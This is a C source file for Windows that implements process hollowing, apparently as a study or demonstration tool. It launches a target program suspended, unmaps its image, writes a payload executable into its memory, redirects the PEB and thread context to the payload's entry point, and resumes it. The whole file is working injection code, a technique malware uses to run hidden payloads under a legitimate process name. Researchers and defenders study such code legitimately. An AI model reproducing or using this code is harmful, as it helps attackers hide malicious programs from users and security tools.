#include "processHollowing.h"

int _tmain(int argc, _TCHAR* argv[])
{
	int returnCode = 0;
	
	if (argc > 2) {
		fprintf(stderr, "*** Hello in Process Hollowing ! ***\n");
		returnCode = _CreateProcess(argv[1], argv[2]);
	}
	else {
		fprintf(stderr, "**** Usage : [Tech]ProcessHollowing.exe <pathTarget.exe> <pathPayload.exe> ****\n");
	}

	return returnCode;
}

int _CreateProcess(LPCWSTR targetPath, LPCWSTR sourcePath)
{
	int returnCode = 0;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	PAYLOADFILE payload;

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	/* STEP 1 : Create process in suspended mode */

	if (!CreateProcessW(targetPath, NULL, 0, 0, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &si, &pi))
		EXIT_WITH_ERROR("/!/ CreateProcessW failed !");

	fprintf(stderr, "*** Step 1 :  CreateProcess in suspended succeeded ! ***\n");

	//system("pause");

	/* STEP 2 : Read payload */
	
	returnCode = ReadPayload(sourcePath, &payload);
	
	//system("pause");

	/* STEP 3 : UnMap memory of target and inject payload */
	if (returnCode == 0)
		UnMapAndInject(&pi, payload.lpBuffer, payload.payloadSize);


	/* Clean up */
	
	UnmapViewOfFile(payload.lpBuffer);
	CloseHandle(payload.hmapFile);
	CloseHandle(payload.hpayloadFile);

	NtTerminateProcess(pi.hProcess, 1);
	return returnCode;
}

int ReadPayload(LPCWSTR sourcePath, PPAYLOADFILE payload)
{
	memset(payload, 0, sizeof(PAYLOADFILE));

	payload->hpayloadFile = CreateFile(sourcePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (payload->hpayloadFile == INVALID_HANDLE_VALUE)
		EXIT_WITH_ERROR("/!/ Error with handle of payload file !");

	fprintf(stderr, "*** Step 2 :  Read payload succeeded ! ***\n");

	payload->payloadSize = GetFileSize(payload->hpayloadFile, NULL);

	if (!payload->payloadSize)
		EXIT_WITH_ERROR("/!/ GetFileSize failed !");

	payload->hmapFile = CreateFileMapping(payload->hpayloadFile, NULL, PAGE_READONLY | SEC_COMMIT, 0, payload->payloadSize, NULL);

	if (!payload->hmapFile)
		EXIT_WITH_ERROR("/!/ CreateFileMapping failed !");

	fprintf(stderr, "	*** CreateFileMapping succeeded ! , hmapfile = %p, size = %ld ***\n", payload->hmapFile, payload->payloadSize);
	
	payload->lpBuffer = MapViewOfFile(payload->hmapFile, FILE_MAP_READ, 0, 0, 0);

	if (!payload->lpBuffer)
		EXIT_WITH_ERROR("/!/ MapViewOfFile failed !");

	fprintf(stderr, "	*** MapViewOfFile succeeded ! , lpBuffer = %p ***\n",payload->lpBuffer);

	return 0;
}

int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
{
	PEB peb;
	CONTEXT contextThread;
	DWORD oldProtect;
	LPVOID pIBA;
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;
	
	/* Get the context of the main thread */

	ZeroMemory(&contextThread, sizeof(CONTEXT));
	contextThread.ContextFlags = CONTEXT_FULL;

	fprintf(stderr, "	*** Handle process = 0x%x ***\n", pPi->hProcess);

	if (!GetThreadContext(pPi->hThread, &contextThread))
		EXIT_WITH_ERROR("/!/ GetThreadContext failed !");

	fprintf(stderr, "*** Step 3 :  GetThreadContext succeeded, RIP : 0x%x  RDX : 0x%x ***\n ", contextThread.Rip, contextThread.Rdx);

	//system("pause");

	/* Read PEB of the target */

	if (!ReadProcessMemory(pPi->hProcess, (LPCVOID) contextThread.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
		EXIT_WITH_ERROR("/!/ ReadProcessMemory failed !");
	
	fprintf(stderr, "	*** ReadProcessMemory succeeded ! Image Base Address : %p ***\n", peb.Reserved3[1]);

	//system("pause");

	/* Get Header */

	pDosH	=	(PIMAGE_DOS_HEADER)buffer;
	pNtH	=	(PIMAGE_NT_HEADERS)((LPBYTE)buffer + pDosH->e_lfanew);

	fprintf(stderr, "	*** Get Header, nbr of section = %d ***\n", pNtH->FileHeader.NumberOfSections);

	//system("pause");

	/* Unmap the target at PEB */

	NtUnmapViewOfSection _ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

	if (_ntUnmapViewOfSection(pPi->hProcess, peb.Reserved3[1]) != 0)
		EXIT_WITH_ERROR("/!/ NtUnmapViewOfSection failed !");

	fprintf(stderr, "	*** NtUnmapViewOfSection succeeded at 0x%x ***\n", peb.Reserved3[1]);

	/* STEP 4 : Allocate new memory and write each sections */ 
	
	pIBA = VirtualAllocEx(pPi->hProcess, peb.Reserved3[1], pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	fprintf(stderr, "*** Step 4 : Write Payload,  New pIBA = 0x%x ***\n", pIBA);

	if (!pIBA)
		EXIT_WITH_ERROR("/!/ Error allocate in pIBA !");

	system("pause");

	/* STEP 5 : Write Payload */

	if (!WriteProcessMemory(pPi->hProcess, pIBA, buffer, pNtH->OptionalHeader.SizeOfHeaders, NULL))
		EXIT_WITH_ERROR("/!/ Error WriteProcessMemory pIBA ! ");

	for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {

		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		fprintf(stderr, "	\n*** Section %s : ***\n", pSecH->Name);
		fprintf(stderr, "	*** Virtual Address : 0x%x ***\n", pSecH->VirtualAddress);
		fprintf(stderr, "	*** Raw Size : %d ***\n", pSecH->SizeOfRawData);
		fprintf(stderr, "	*** Pointer to raw data : 0x%x ***\n", pSecH->PointerToRawData);
		fprintf(stderr, "	*** Characteristics : %x ***\n", pSecH->Characteristics);

		if (!WriteProcessMemory(pPi->hProcess, (LPVOID)((LPBYTE)pIBA + pSecH->VirtualAddress), (LPVOID)((LPBYTE)buffer + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL))
			EXIT_WITH_ERROR("/!/ WriteProcessMemory Section failed ! ");
			
		VirtualProtectEx(pPi->hProcess, (LPVOID)((LPBYTE)pIBA + pSecH->VirtualAddress), pSecH->Misc.VirtualSize, pSecH->Characteristics & 0xFFF, &oldProtect);

	}

	if (!WriteProcessMemory(pPi->hProcess, (LPVOID)(contextThread.Rdx + FIELD_OFFSET(PEB, Reserved3[1])), (LPVOID)&pIBA, sizeof(LPVOID), NULL))
		EXIT_WITH_ERROR("/!/ Error WriteProcessMemory new PEB !");

	system("pause");

	/* STEP 6 : Set thread Context*/
	contextThread.Rdx = (DWORD)pIBA;

	contextThread.Rcx = (SIZE_T)((LPBYTE)pIBA + pNtH->OptionalHeader.AddressOfEntryPoint);

	fprintf(stderr, "*** Step 5 : Set thread context, Entry Point : %#zx ***\n", contextThread.Rcx);

	if (!SetThreadContext(pPi->hThread, (PCONTEXT)&contextThread))
		EXIT_WITH_ERROR("/!/ Error SetThreadContext ! ");

	fprintf(stderr, "	*** Set Thread Context succeeded ! ***\n");

	system("pause");

	//TODO : Resume thread bug with some programs in payload (crash of app), because 64bit ?  Works with cmd.exe in payload ! 

	ResumeThread(pPi->hThread);

	fprintf(stderr, "*** Step 6 : Resume Thread succeedeed ! ***\n");

	system("pause");

	return 0;
}